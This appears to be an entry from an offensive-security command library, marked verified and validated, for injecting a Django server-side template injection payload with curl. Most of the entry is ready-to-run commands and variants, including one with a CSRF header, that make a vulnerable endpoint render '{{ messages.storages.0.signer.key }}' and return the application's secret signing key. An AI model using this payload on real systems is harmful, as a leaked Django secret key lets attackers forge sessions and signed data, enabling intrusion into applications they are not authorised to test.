---
type: command
executor: bash
data: >-
  curl -X POST http://target.com/vulnerable-endpoint -d "input={{
  messages.storages.0.signer.key }}"
output: null
created_at: '2023-04-06T03:56:39Z'
updated_at: '2023-04-10T20:23:40Z'
platforms:
  - Web
tags:
  - ssti
  - django
verified: true
validated: true
---

# Inject-Django-SSTI-Payload

## Command

```bash
curl -X POST $_TARGET_URL -d "input={{ messages.storages.0.signer.key }}"
```

## Description

This command sends a crafted HTTP request to inject an SSTI payload into a vulnerable Django template endpoint, leaking the signer key from the messages storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The vulnerable endpoint URL (e.g., http://target.com/search) | Yes |
| input | The parameter name vulnerable to injection (adjust based on app) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/vulnerable -d "query={{ messages.storages.0.signer.key }}"
```

### With Headers (e.g., for CSRF)

```bash
curl -X POST http://target.com/vulnerable -H "X-CSRFToken: token" -d "input={{ messages.storages.0.signer.key }}"
```

## Expected Output

The response body contains the leaked signer key, e.g.,

```
django-insecure-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

If injection fails, expect template errors or no output.

## Related

- [[procedures/Exploit-Django-Template-SSTI-to-Leak-Signer-Key]]
